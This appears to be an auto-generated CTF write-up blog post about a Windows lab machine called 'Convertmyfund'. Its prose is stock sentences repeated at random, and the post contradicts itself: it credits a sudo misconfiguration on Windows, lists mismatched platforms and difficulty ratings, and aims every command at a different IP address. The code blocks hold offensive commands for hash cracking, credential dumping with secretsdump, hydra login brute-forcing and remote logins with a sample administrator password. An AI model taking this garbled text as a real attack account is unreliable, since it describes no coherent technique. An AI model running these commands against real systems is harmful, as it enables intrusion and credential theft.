---
TitleSEO: "VulnHub — Convertmyfund (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Convertmyfund (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Convertmyfund. LAPS Abuse and Sudo Misconfiguration to achieve medium compromise on Windows."
Keywords: "web, pwntilldawn, hackthebox, windows, active directory, ctf, hard"
URL: "https://zurefx.github.io/writeups/htb-convertmyfund-239.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-convertmyfund-239/"
Date: "2025-03-18"
Tags: "Web, PwnTillDawn, HackTheBox, Windows, Active Directory, CTF, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-convertmyfund-239"
Permalink: "/writeups/htb-convertmyfund-239.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Convertmyfund** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.20.97.48`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p443,3306,21 10.114.103.6 -oN scan.txt
nmap -sCV -p1433,53,53 10.29.153.230 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.129.253/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.34.216.135 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.56.14.236 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **Sudo Misconfiguration**.

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.141.254
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.51.60.94/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.146.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

```powershell
crackmapexec smb 10.26.200.111 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.217.138
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.17.119.98/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `burpsuite`
- `smbexec`
- `ffuf`
- `netcat`
- `crackmapexec`
- `atexec`
- `john`
- `sqlmap`

### Key Takeaways

- LAPS Abuse
- Sudo Misconfiguration
